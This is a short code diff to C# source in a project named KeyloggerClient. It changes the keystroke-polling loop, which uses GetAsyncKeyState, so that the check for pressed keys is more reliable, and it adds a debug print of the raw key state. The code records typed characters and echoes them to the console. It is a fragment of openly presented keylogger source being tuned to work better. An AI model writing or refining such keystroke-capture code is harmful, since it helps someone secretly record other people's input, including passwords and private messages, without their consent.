@@ -48,7 +48,8 @@ namespace KeyloggerClient
                 for (int i = 32; i < 127; i++)
                 {
                     int keyState = GetAsyncKeyState(i);
-                    if (keyState == -32767)
+                    Console.Write(keyState);
+                    if ((keyState & 0x1) != 0)
                     {
                         char keyChar = (char)i;
                         Console.Write(keyChar + ", ");
